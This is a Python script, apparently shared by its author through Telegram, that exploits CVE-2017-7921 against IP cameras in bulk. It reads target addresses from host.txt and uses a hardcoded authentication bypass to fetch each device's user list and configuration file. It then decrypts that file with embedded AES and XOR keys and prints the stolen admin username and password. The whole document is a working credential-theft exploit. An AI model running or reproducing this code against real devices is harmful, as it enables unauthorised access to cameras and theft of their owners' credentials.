"""
Nombre del archivo: HostSlick.py
Autor: SlickMercy
Fecha de creación: 7 de junio de 2023
Descripción: TG: SlickMercy.

Este código está sujeto a derechos de autor. Todos los derechos están reservados.
"""
import asyncio
import aiohttp
from Crypto.Cipher import AES
from itertools import cycle
import re
from colorama import init, Fore
import sys

init(autoreset=True)

async def config_decryptor(data):
    """
    vars:
      - data: binary content, such as requests.content or open('xx', 'rb')
    return:
      - (user, passwd)
    """
    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s

    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    xor = xore(decrypt(data))
    res = strings(xor.decode('ISO-8859-1'))
    idx = -res[::-1].index('admin')
    user, passwd = res[idx - 1], res[idx]
    return user, passwd


async def cve_2017_7921(ip: str) -> list:
    headers = {'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
    timeout = 15

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(user_url, timeout=timeout, headers=headers) as r:
                if r.status == 200:
                    response_text = await r.text()
                    if 'userName' in response_text and 'priority' in response_text and 'userLevel' in response_text:
                        async with session.get(config_url, timeout=timeout * 2, headers=headers) as rc:
                            if rc.status == 200:
                                content = await rc.read()
                                user, passwd = await config_decryptor(content)
                                return [True, str(user), str(passwd), 'cve-2017-7921']
    except Exception as e:
        with open('error.log', 'a') as error_file:
            error_file.write(str(e) + '\n')
    return [False, ]


async def decode_from_host_file():
    with open('host.txt', 'r') as file:
        lines = file.readlines()
        tasks = []
        for line in lines:
            ip_address = line.strip()
            tasks.append(cve_2017_7921(ip_address))

        results = await asyncio.gather(*tasks)
        for ip_address, result in zip(lines, results):
            if result[0]:
                print(f"IP: {ip_address.strip()} - Result: {Fore.GREEN}{result}{Fore.RESET}")
            else:
                print(f"IP: {ip_address.strip()} - Result: {result}")


# Redirigir la salida de errores a un archivo
sys.stderr = open('error.log', 'w')

asyncio.run(decode_from_host_file())
